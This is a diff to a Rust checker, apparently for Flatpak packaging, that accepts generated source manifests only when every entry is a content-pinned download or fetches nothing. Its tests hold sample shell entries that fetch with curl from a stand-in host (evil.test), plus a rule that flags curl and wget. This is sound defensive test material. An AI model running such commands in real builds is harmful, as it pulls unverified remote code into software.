@@ -332,11 +332,15 @@ fn allowed_source(url: &str, text: &str) -> bool {
     pinned && text.contains("sha256sum -c")
 }
 
-/// Whether `file` is a JSON file below `packaging/flatpak/generated/` whose `text` is an array in which every entry carries a
-/// sha256 (64 lower-case hex digits) or, for a git source, a 40-character commit. Such a file is the output of the source
-/// tools (`scripts/flatpak-zig-sources.sh`): its `url` fields are fetches, and each is pinned by content, so none of them
-/// needs to be listed by host. An entry without a pin, a pin of another length, or a file that is not such an array fails.
-/// The rule is by context (the folder, the file kind and the pins), never by host.
+/// Whether `file` is a JSON file below `packaging/flatpak/generated/` whose `text` is an array in which every entry is either a
+/// fetch that is pinned by content, or text that fetches nothing. A fetch has a `url` and carries a sha256 (64 lower-case hex
+/// digits), a sha512 (128) or, for a git source, a 40-character commit. An `inline` entry (a file the tool writes: the checksum
+/// files cargo wants, the vendoring configuration, the npm cache index) has no `url`, and a `script` or `shell` entry (copy
+/// commands) has none either and its commands do not run `curl` or `wget` and name no address. Such a file is the output of the
+/// source tools (`scripts/flatpak-zig-sources.sh`, `scripts/flatpak-generate-sources.sh`): its `url` fields are fetches, and each
+/// is pinned by content, so none of them needs to be listed by host. An entry without a pin, a pin of another length, an entry that
+/// fetches by another way, or a file that is not such an array fails. The rule is by context (the folder, the file kind and the
+/// pins), never by host.
 fn generated_sources_are_pinned(file: &Path, text: &str) -> bool {
     let hex = |value: Option<&Value>, length: usize| {
         value.and_then(Value::as_str).is_some_and(|v| v.len() == length && v.chars().all(|c| matches!(c, '0'..='9' | 'a'..='f')))
@@ -345,9 +349,25 @@ fn generated_sources_are_pinned(file: &Path, text: &str) -> bool {
     let Ok(Value::Array(entries)) = serde_json::from_str::<Value>(text) else {
         return false;
     };
-    in_generated_folder
-        && !entries.is_empty()
-        && entries.iter().all(|entry| entry.get("url").is_some() && (hex(entry.get("sha256"), 64) || hex(entry.get("commit"), 40)))
+    let fetches_nothing = |entry: &Value| match entry.get("type").and_then(Value::as_str) {
+        Some("inline") => entry.get("url").is_none() && entry.get("commands").is_none(),
+        Some("script" | "shell") => {
+            let commands = entry.get("commands").and_then(Value::as_array);
+            entry.get("url").is_none()
+                && commands.is_some_and(|c| {
+                    c.iter().all(|command| {
+                        let command = command.as_str().unwrap_or("://");
+                        !command.contains("://")
+                            && !command.split(|ch: char| !(ch.is_ascii_alphanumeric() || ch == '_' || ch == '-')).any(|w| matches!(w, "curl" | "wget"))
+                    })
+                })
+        }
+        _ => false,
+    };
+    let pinned_fetch = |entry: &Value| {
+        entry.get("url").is_some() && (hex(entry.get("sha256"), 64) || hex(entry.get("sha512"), 128) || hex(entry.get("commit"), 40))
+    };
+    in_generated_folder && !entries.is_empty() && entries.iter().all(|entry| pinned_fetch(entry) || fetches_nothing(entry))
 }
 
 /// The fetched addresses of `file` (with this `text`) that nothing allows: none for a generated sources file whose every entry
@@ -419,6 +439,31 @@ fn a_url_in_a_generated_sources_file_is_allowed_only_when_every_entry_is_pinned(
     assert!(!generated_sources_are_pinned(&generated, &format!("[{branch}]")), "a git source on a branch");
     let short_commit = "{\"type\": \"git\", \"url\": \"https://example.net/x.git\", \"commit\": \"deadbee\"}";
     assert!(!generated_sources_are_pinned(&generated, &format!("[{short_commit}]")), "a short commit");
+    // The tools of the Cargo and npm sources write more than downloads: text files and copy commands. Those fetch nothing, so they
+    // pass; a sha512 pins a download too (npm's own hash); a command that fetches, or an entry of another kind, does not pass.
+    let inline = "{\"type\": \"inline\", \"contents\": \"[source.crates-io]\", \"dest\": \"cargo\", \"dest-filename\": \"config\"}";
+    let copy = "{\"type\": \"shell\", \"commands\": [\"cp -r a b\"]}";
+    let sha512 = "c".repeat(128);
+    let npm_file = format!("{{\"type\": \"file\", \"url\": \"https://example.net/x.tgz\", \"sha512\": \"{sha512}\"}}");
+    assert!(generated_sources_are_pinned(&generated, &format!("[{pinned_archive}, {inline}, {copy}, {npm_file}]")), "downloads, text and copy commands");
+    let curl = "{\"type\": \"shell\", \"commands\": [\"curl -O https://evil.test/x\"]}";
+    let curl_no_address = "{\"type\": \"shell\", \"commands\": [\"sh -c 'curl $X'\"]}";
+    let address = "{\"type\": \"script\", \"commands\": [\"echo https://evil.test/x\"]}";
+    let shell_with_url = "{\"type\": \"shell\", \"url\": \"https://evil.test/x\", \"commands\": [\"true\"]}";
+    let inline_with_url = "{\"type\": \"inline\", \"url\": \"https://evil.test/x\", \"contents\": \"x\"}";
+    let unknown_kind = "{\"type\": \"extra-data\", \"filename\": \"x\"}";
+    let short_sha512 = "{\"type\": \"file\", \"url\": \"https://example.net/x.tgz\", \"sha512\": \"abc\"}";
+    for (what, entry) in [
+        ("a shell entry that runs curl", curl),
+        ("a shell entry that runs curl with no address", curl_no_address),
+        ("a script entry that names an address", address),
+        ("a shell entry with a url", shell_with_url),
+        ("an inline entry with a url", inline_with_url),
+        ("an entry of an unknown kind", unknown_kind),
+        ("a short sha512", short_sha512),
+    ] {
+        assert!(!generated_sources_are_pinned(&generated, &format!("[{pinned_archive}, {entry}]")), "{what}");
+    }
     // Not a list of entries, no entry, or invalid JSON: nothing is allowed.
     assert!(!generated_sources_are_pinned(&generated, "[]"), "an empty list");
     assert!(!generated_sources_are_pinned(&generated, &pinned_archive), "an object instead of a list");
